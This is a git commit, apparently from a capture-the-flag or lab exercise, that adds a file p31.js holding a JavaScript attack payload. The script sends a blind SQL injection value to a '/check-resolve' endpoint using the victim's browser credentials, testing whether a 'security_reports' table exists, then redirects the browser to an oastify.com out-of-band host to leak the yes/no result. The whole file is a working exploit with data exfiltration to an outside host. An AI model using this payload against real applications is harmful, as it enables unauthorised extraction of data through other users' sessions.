c638e64901530e798506e40b5471428c42c0ad01
NguyenKhacHoangPhuc <tenemailcuaem@gmail.com>
2026-03-06 14:23:23 +0700

    a

---
+++ p31.js
@@ -0,0 +1,14 @@
+(async()=>{
+ const b=new URLSearchParams();
+ b.append('id',"CASE WHEN((SELECT count(*) FROM sqlite_master WHERE name='security_reports')>0)THEN 6 ELSE 7 END");
+
+ const r=await fetch('/check-resolve',{
+  method:'POST',
+  headers:{'Content-Type':'application/x-www-form-urlencoded'},
+  body:b,
+  credentials:'include'
+ });
+
+ const t=await r.text();
+ location='69dhe9lld0mljzazkdptyo7xlorff83x.oastify.com/'+(t.includes('Not yet')?'Y':'N');
+})();
